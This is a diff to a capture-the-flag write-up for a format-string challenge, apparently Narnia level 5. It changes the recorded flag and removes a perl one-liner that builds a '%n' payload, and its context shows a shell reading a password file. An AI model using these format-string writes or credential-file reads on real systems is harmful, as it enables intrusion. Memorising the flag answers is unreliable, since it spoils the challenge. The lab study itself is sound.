@@ -5,7 +5,7 @@
 **Completion Date & Time :** 2026 - 02 - 26 / 14:53
 
 ---
-## FLAG : `BNSjoSDeGL`
+## FLAG : `uK3ikaZLxB`
 
 ---
 ## Solution :
@@ -40,10 +40,6 @@ int main(int argc, char **argv){
 This program ask for an *`argument`* and our task is to modify the value `i` from 1 to 500.
 Looks carefully on `snprintf(buffer, sizeof buffer, argv[1]);`, this line mean, it will just do `printf(buffer)` with saving the output in `buffer`, it has no any guards. This could lead to [[Format String Attack]].
 
-\xa0\xd3\xff\xff 
-```bash
-perl -e 'print "\xa0\xd3\xff\xff " . "%500%n" '
-```
 ### Step 2 : Find the Gap and `i` address.
 
 Input Payload : 
@@ -84,7 +80,7 @@ Change i's value from 1 -> 500. GOOD
 $ whoami
 narnia6
 $ cat /etc/narnia_pass/narnia6
-BNSjoSDeGL
+uK3ikaZLxB
 
 ```
 
